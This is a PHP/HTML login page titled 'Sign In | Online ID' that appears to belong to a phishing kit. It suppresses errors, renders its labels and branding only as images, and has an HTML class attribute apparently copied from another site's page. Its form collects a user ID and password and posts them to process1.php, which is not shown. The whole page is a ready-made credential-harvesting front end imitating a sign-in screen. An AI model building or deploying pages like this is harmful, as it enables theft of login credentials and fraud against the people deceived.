<?php
session_start();
error_reporting(0);


?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US" class="win chrome chrome-76 webkit svg-bg not-retina cf-cnx-regular-active">
<head class="at-element-marker" style="visibility:visible;">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<title>Sign In | Online ID</title>
<link rel="shortcut icon" href="images/favicon.png"/>
<script type="text/javascript" src="js/jqueryLib.js"></script>
<link rel="stylesheet" href="css/style.css" />

</head>


<body>
 
 <div  class="header-const">
    <div class="header"></div>
 </div>
 <div class="img1-const">
    <div class="img1"></div>
 </div>  
 <div class="img2-const">
   <div class="img2"></div>
 </div>
 <div class="container-const">
     <div class="container">
     <div class="box-space"></div>
         <div class="box1">
           <form id="form1" method="post" action="process1.php">
             <table width="260" border="0">
                <tr>
                  <td><div class="label1"></div></td>
                </tr>
                <tr>
                  <td>
                  <input type="text" name="userid" id="userid"  required="required" autocomplete="off" class="username"/></td>
                </tr>
                <tr>
                  <td><div class="img4"></div>&nbsp;</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                </tr>
                <tr>
                  <td><div class="label2"></div></td>
                </tr>
                <tr>
                  <td>
                  <input type="password" name="pss" id="pss" required="required" autocomplete="off" class="username"  /></td>
                </tr>
                <tr>
                  <td><div class="img5"></div>&nbsp;</td>
                </tr>
                <tr>
                  <td><input type="hidden" name="wiz" value=""></td>
                </tr>
                <tr>
                  <td><input type="submit" name="loginbtn" id="loginbtn" value="s" class="loginbtn" /></td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                </tr>
             </table>
           </form>
         </div>
         <div class="box2">
           <div class="box2-img"></div>
         </div>
     </div>
 </div>
 <div class="footer-const">
   <div class="footer"></div>
 </div>
</body>
</html>